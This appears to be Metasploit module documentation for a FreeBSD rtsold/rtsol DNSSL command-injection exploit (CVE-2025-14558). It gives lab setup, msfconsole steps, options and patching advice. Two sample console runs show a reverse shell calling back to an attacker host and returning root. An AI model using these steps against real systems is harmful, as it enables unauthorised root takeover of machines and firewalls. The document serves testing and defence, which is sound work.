## Vulnerable Application

This module exploits a command injection vulnerability (CVE-2025-14558) in FreeBSD's
rtsold(8) and rtsol(8) IPv6 router advertisement processing, documented in
FreeBSD-SA-25:12.rtsold.

### Background

rtsold(8) and rtsol(8) are programs which process router advertisement
packets as part of the IPv6 stateless address autoconfiguration (SLAAC)
mechanism.

### Problem Description

The rtsol(8) and rtsold(8) programs do not validate the domain search list
(DNSSL) options provided in router advertisement messages; the option body is passed
to resolvconf(8) unmodified.

resolvconf(8) is a shell script which does not validate its input. A lack of
quoting meant that shell commands passed as input to resolvconf(8) may be
executed with root privileges.

### Attack Vector

An attacker on the local network segment can send malicious IPv6 Router
Advertisement packets containing crafted DNSSL (Domain Name Search List) options.
When processed by rtsold/rtsol, these options are passed to resolvconf(8) without
validation, allowing arbitrary command execution with the privileges of the rtsold
daemon (typically root).

### Vulnerable Versions

This vulnerability affects FreeBSD systems running rtsold or rtsol with
router advertisement acceptance enabled (ACCEPT_RTADV flag). The vulnerability was
disclosed in January 2025 and affects:

* FreeBSD 13.x (before 13.4-RELEASE-p2)
* FreeBSD 14.x (before 14.2-RELEASE-p1)
* FreeBSD 15.x (before 15.0-RELEASE-p1)
* Older FreeBSD versions running rtsold/rtsol

Systems are vulnerable if:
1. rtsold or rtsol is running
2. At least one network interface has the ACCEPT_RTADV flag set
3. The system has not been patched for FreeBSD-SA-25:12.rtsold

### Setup

To test this vulnerability in a lab environment:

1. Install a vulnerable FreeBSD version (e.g., FreeBSD 13.3 or 14.1)
2. Configure an interface to accept router advertisements:
   ```
   ifconfig em0 inet6 accept_rtadv
   ```
3. Start rtsold:
   ```
   service rtsold onestart
   ```
   Or add to `/etc/rc.conf`:
   ```
   rtsold_enable="YES"
   rtsold_flags="-f"
   ```
4. Verify the interface accepts RAs:
   ```
   ifconfig | grep ACCEPT_RTADV
   ```

## Verification Steps

1. Obtain a shell session on a FreeBSD system
2. Start `msfconsole`
3. `use exploit/freebsd/local/rtsold_dnssl_command_injection`
4. `set SESSION <SESSION_ID>`
5. `set LHOST <your_ip>`
6. `set LPORT <your_port>`
7. `check` - Verify the target is vulnerable
8. `run`
9. You should receive a new session with root privileges

## Options

### SESSION

The session ID to run the exploit against (required).

### WritableDir

A directory where temporary files can be written. Default: `/tmp`

### Interface

Network interface to use for sending router advertisements. If not specified,
the module will auto-detect an interface with the ACCEPT_RTADV flag.

### ForceExploit

Override the check result and run the exploit anyway. Default: `false`

Use this option with caution, as running the exploit on non-vulnerable systems
may cause unexpected behavior.

## Scenarios

### FreeBSD 13.3-RELEASE (amd64)

This scenario demonstrates exploiting a FreeBSD 13.3 system with rtsold enabled.

```
msf6 > use exploit/freebsd/local/rtsold_dnssl_command_injection
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > set SESSION 1
SESSION => 1
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > check

[*] System is FreeBSD
[*] FreeBSD version: 13.3-RELEASE
[+] rtsold or rtsol is running
[+] At least one interface accepts router advertisements
[+] resolvconf is installed
[*] The target appears to be vulnerable.

msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > run

[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Using interface: em0
[*] Creating payload script...
[*] Writing '/tmp/.Abc123.sh' (89 bytes) ...
[*] Creating IPv6 RA injection script...
[*] Writing '/tmp/.Xyz789.py' (4521 bytes) ...
[*] Sending malicious IPv6 Router Advertisement with DNSSL payload...
[*] Sending malicious RA on em0...
[*] RA sent successfully
[*] Waiting for payload execution...
[+] Success! Payload executed with root privileges
[*] Command shell session 2 opened (192.168.1.100:4444 -> 192.168.1.50:12345) at 2025-01-21 10:45:00 -0500
[+] Deleted /tmp/.Abc123.sh
[+] Deleted /tmp/.Xyz789.py

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
FreeBSD fbsd13 13.3-RELEASE FreeBSD 13.3-RELEASE releng/13.3-n257433-c7136ac66524 GENERIC amd64
```

### FreeBSD 14.1-RELEASE with pfSense

This vulnerability also affects pfSense and OPNsense systems, which are based
on FreeBSD and run rtsold in certain configurations.

```
msf6 > use exploit/freebsd/local/rtsold_dnssl_command_injection
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > set SESSION 1
SESSION => 1
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > set LHOST 10.0.0.1
LHOST => 10.0.0.1
msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > check

[*] System is FreeBSD
[*] FreeBSD version: 14.1-RELEASE-p1
[+] rtsold or rtsol is running
[+] At least one interface accepts router advertisements
[+] resolvconf is installed
[*] The target appears to be vulnerable.

msf6 exploit(freebsd/local/rtsold_dnssl_command_injection) > run

[*] Started reverse TCP handler on 10.0.0.1:4444
[*] Using interface: igb0
[*] Creating payload script...
[*] Writing '/tmp/.RtSol456.sh' (89 bytes) ...
[*] Creating IPv6 RA injection script...
[*] Writing '/tmp/.RaPkt789.py' (4521 bytes) ...
[*] Sending malicious IPv6 Router Advertisement with DNSSL payload...
[*] Waiting for payload execution...
[+] Success! Payload executed with root privileges
[*] Command shell session 2 opened (10.0.0.1:4444 -> 10.0.0.50:34567) at 2025-01-21 11:00:00 -0500

id
uid=0(root) gid=0(wheel) groups=0(wheel)
```

## References

* [FreeBSD Security Advisory FreeBSD-SA-25:12.rtsold](https://www.freebsd.org/security/advisories/FreeBSD-SA-25:12.rtsold.asc)
* [CVE-2025-14558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14558)
* [Metasploit Framework Issue #20789](https://github.com/rapid7/metasploit-framework/issues/20789)
* [Netgate pfSense Advisory](https://www.netgate.com/blog/security-advisory-potential-remote-command-execution-via-dnssl-router-advertisement-messages)

## Remediation

To protect against this vulnerability:

1. **Apply security patches** - Update to patched versions:
   * FreeBSD 13.4-RELEASE-p2 or later
   * FreeBSD 14.2-RELEASE-p1 or later
   * FreeBSD 15.0-RELEASE-p1 or later

2. **Disable router advertisements** - If not needed:
   ```
   ifconfig <interface> inet6 -accept_rtadv
   service rtsold stop
   ```

3. **Firewall ICMPv6 RAs** - Block untrusted Router Advertisement packets:
   ```
   # Block RAs on WAN interfaces
   ipfw add deny icmp6 from any to any icmp6types 134
   ```

4. **Network segmentation** - Limit exposure to untrusted networks
